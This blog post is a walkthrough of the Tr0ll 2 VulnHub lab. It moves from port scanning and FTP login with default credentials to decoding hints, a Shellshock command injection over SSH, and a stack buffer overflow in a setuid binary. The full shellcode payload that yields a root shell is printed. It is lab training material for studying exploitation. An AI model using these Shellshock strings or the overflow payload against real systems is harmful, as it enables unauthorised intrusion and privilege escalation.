---
layout: post
title: "Tr0ll 2 - There be trolls"
date: 2017-06-06 08:58:25 -0400
comments: true
categories: [penetration testing, writeups]
keywords: troll 2, tr0ll 2, shellshock, troll 2 walkthrough, tr0ll 2 walkthrough, troll 2 solution, tr0ll 2 solution, troll 2 writeup, tr0ll 2 writeup, troll 2 vulnhub, tr0ll 2 vulnhub, troll 2 boot2root, tr0ll 2 boot2root, pentesting, ctf, pentest lab
description: Tr0ll 2 writeup
---

It's time to slay the second troll in the Tr0ll series!

<!-- more -->

First, a bit of enumeration:

``` 
Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor              
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor              
 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor              
 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor   
```

The IP we want is 192.168.217.129.

``` 
nmap -p- -sV -T4 192.168.217.129

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-30 10:27 EDT
Nmap scan report for 192.168.217.129
Host is up (0.000088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:CB:3D:2E (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

You know the drill! Something awaits us on that web server!

{% img center /images/pentest/tr0ll2/troll.png 'troll' 'troll' %}

And a comment in the source:

``` html
<!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```

I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there's a robots.txt file, and there was..but, oh, the horror:

``` 
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

Ok, let's look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:

{% img center /images/pentest/tr0ll2/noob.png 'noob' 'noob' %}

Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:

``` 
ftp 192.168.217.129
Connected to 192.168.217.129.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.217.129:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (8.4682 MB/s)
```

After downloading the archive, I tried extracting it, but of course there's a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.

Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:

``` 
ls -l
total 68
-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
```

I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:

``` 
Look Deep within y0ur_self for the answer
```

Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:

``` 
wc -l answer.txt 
99157 answer.txt
```

I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll's fixation on using underscores, so I tried doing a recursive grep for that:

``` 
grep -r "_" decoded.txt 
noooob_lol
```

That didn't work as a password. Next I looked for longest line:

``` 
wc -L decoded.txt 
30 decoded.txt
```

According to this command, the longest line's length is 30. I whipped up a quick Python script to find all lines with the length of 30:

``` python
#!/usr/bin/env python

import argparse

desc = "Find and print lines from a file that are a certain length"
parser = argparse.ArgumentParser(description=desc)

# length argument
parser.add_argument(
    '-l',
    help = 'Length value',
    dest = 'length',
    type = int,
    required=True
)

# file add_argument
parser.add_argument(
    '-f',
    help = 'Filename',
    dest = 'filename',
    type = str,
    required=True
)

args = parser.parse_args()

with open(args.filename, "r") as f:
	for line in f.readlines():
		# strip the newline character for accurate counting
		if len(line.strip('\n')) == args.length:
			print line
```

Ran it and BOOM:

``` 
python line_length.py -l 30 -f decoded.txt
ItCantReallyBeThisEasyRightLOL
```

This sounds exactly like the troll! Now I was finally able to extract the archive:

``` 
unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob            
```

It looks like it's a private key:

``` 
file noob
noob: PEM RSA private key
```

I tried SSH'ing as noob this time:

``` 
ssh -i noob noob@192.168.217.129
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
```

Well, that didn't help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted! 

First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:


``` 
ssh -i noob noob@192.168.217.129 -t "() { :; }; pwd"
/home/noob
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
```

Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let's see if we can spawn a shell:

``` 
ssh -i noob noob@192.168.217.129 -t "() { :; }; /bin/bash"
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
```

Finally, we're in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.

### Shellshock explained

Because Bash is a scripting language, you can do things like defining functions:

``` 
myfunction() { echo "I am a function"; }
```

And then you call it:

``` 
noob@Tr0ll2:~$ myfunction
I am a function
```

You can also export functions to environment variables, so they can be run by new bash instances:

``` 
noob@Tr0ll2:~$ export -f myfunction
noob@Tr0ll2:~$ env 
[...]
myfunction=() {  echo "I am a function"
}
```

Now the function definition is inside the environment variable, and it can be evaluated:

``` 
bash -c myfunction
I am a function
```

This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end. 

``` 
export shocking='() { echo "This is safe" ; }; echo "This is NOT safe"'
bash -c shocking
This is NOT safe
This is safe
```

Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway. 

Next, the attack fools the shell into accepting a bogus function definition. You can use [this string](https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b) to see if your bash is vulnerable to Shellshock: <code>x='() { :;}; echo VULNERABLE' bash -c :</code>.

Now we know that what looked like gibberish before, is actually the syntax for defining functions. With a diference of a colon instead of a function statement. The <code>:</code> is a []shell built-in(https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b) that does nothing. So, to the vulnerable shell, the function definition doesn't perform any action, and is then followed by an arbitrary command, that is happily executed: <code>() { :;}; CODE</code>.

Ok, back to the Tr0ll! To also confirm the SSH vulnerability, look in authorized_keys:

``` 
noob@Tr0ll2:~$ cat .ssh/authorized_keys 
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
```

There it is, the trolling message was the command that user noob was restricted to. Ok, let's move on and see how we can get root. I searched for some kernel exploits, but could only find some potential exploits for 64 bit systems, and this one is 32 bit. But then:

``` 
ls /
bin   dev  home        lib	   media  nothing_to_see_here  proc  run   selinux  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt	  opt		       root  sbin  srv	    tmp  var
```

Didn't expect to get anything out of this, but..trolls..

``` 
noob@Tr0ll2:/$ file nothing_to_see_here/
nothing_to_see_here/: setuid directory
noob@Tr0ll2:/$ ls -l nothing_to_see_here/
total 4
drwsr-xr-x 5 root root 4096 Oct  4  2014 choose_wisely
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t

door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t

door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 .
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t
```

I expanded the list of files in these directories so I could see everything at a glance. Let's see what we have:

``` 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t 
r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x4ceb2022ad50bc899c84f5e30793fe06b0a166c0, not stripped
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t lol
lol
```

This appears to echo whatever you give it. I tried doing a strings on it but got permission denied error. Moved on to the next executable for now:

``` 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t 
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ 
Broadcast message from noob@Tr0ll2
	(/dev/pts/0) at 12:57 ...

The system is going down for reboot NOW!
Connection to 192.168.217.129 closed by remote host.
Connection to 192.168.217.129 closed.
```

Ok..the troll is trying to annoy us..this binary rebooted the machine. I went on to the third and again it restarted! Not much likely for the binaries to be the same, and it was good that I had the initial picture of the binary sizes! It seems the trolling continues..by switching the binaries between directories! Keep in mind the binary sizes, and check often, because they get moved a lot.

``` plain
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 

2 MINUTE HARD MODE LOL
```

Wasn't sure what this one did, until I got a permission denied when running ls :-) so in those 2 minutes, we are probably stripped by even the basic permissions. By now, it seemed that the only interesting binary would be the one that takes user input (largest one), so I got back to it. I used <code>pattern_create.rb</code> to build a 500 bytes long string and feed it to the binary, and it segfaulted! So, we have a buffer overflow here!

``` plain
Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
```

Let's see where exactly in the pattern it happens:

``` plain
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 0x6a413969 -l 500
[*] Exact match at offset 268
```

Taking a closer look at the registers and stack:

``` plain
(gdb) r $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")

Starting program: /nothing_to_see_here/choose_wisely/door3/r00t $(python -c "print 'A' * 268 + 'B' * 4 + 'C' * 16")

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info r
eax            0x120	288
ecx            0x0	0
edx            0x0	0
ebx            0xb7fd1ff4	-1208147980
esp            0xbffffb50	0xbffffb50
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x42424242	0x42424242
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x $esp
0xbffffb50:	0x43434343
```

ESP has been overwritten with part of our string, so we can craft some shellcode and jump to the address of ESP to execute it. I picked the [Linux x86 execve /bin/sh](https://www.exploit-db.com/exploits/40131/) shellcode, which is 19 bytes long.


What we have now for a functional exploit:

* 268 bytes to fill the buffer

* overwrite EIP with the address of ESP, which is <code>0xbffffb50</code>, and in little endian it is <code>\x50\xfb\xff\xbf</code>

* NOP sled for padding

* shellcode: <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80</code>

Ran the exploit in GDB:

``` 
(gdb) r $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
Starting program: /nothing_to_see_here/choose_wisely/door2/r00t $(python -c 'print "A" * 268 + "\x50\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
process 1838 is executing new program: /bin/dash
$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

Remember that a shell which you get in GDB has the privileges that GDB runs at, so this is not a real root shell. We have to run it outside GDB. I did so and I got a big..segmentation fault! What worked in GDB didn't work outside it, and as I was getting frustrated, I looked at other writeups, to see if anyone else had the same problem. It seems it should have run smoothly, but there can be a discrepancy in memory between a live environment and a GDB one. I tweaked the ESP address a few times, before hitting the right one:


``` 
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x90\xfb\xff\xbf" + "x90" * 16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"')
# id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
# ls /root/	
Proof.txt  core1  core2  core3	core4  goal  hardmode  lmao.zip  ran_dir.py  reboot
# cat /root/Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4  
```

The valid ESP address was <code>0xbffffb90</code>. If you try it in GDB though, you will get a segfault there. Ah, this challenge trolled me on so many levels!

``` 
/ A visit to a fresh place will bring \
\ strange work.                       /
 -------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```


